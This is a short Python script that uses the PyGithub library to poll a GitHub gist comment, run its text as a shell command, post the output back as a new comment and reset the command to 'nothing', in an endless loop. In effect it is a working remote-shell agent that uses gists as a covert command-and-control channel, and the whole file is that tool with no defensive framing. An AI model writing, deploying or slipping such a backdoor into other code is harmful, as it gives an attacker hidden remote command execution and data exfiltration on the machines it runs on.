from github import Github
from github import Auth,InputFileContent
import subprocess
import time
# using an access token
def execute_system_command(cmd):
    output = subprocess.getstatusoutput(cmd)
    return output

auth = Auth.Token("REDACTED_TOKEN")


g = Github(auth=auth)

user = g.get_user()
old_cmd = ""
while True:

    gist = user.get_gist("REDACTED_GIST_ID")
    comment = gist.get_comments()[0]
    if comment.body == "nothing": 
        time.sleep(1)
        continue
    output = execute_system_command(comment.body)[1]
    gist.create_comment(output)
    comment.edit(body="nothing")

    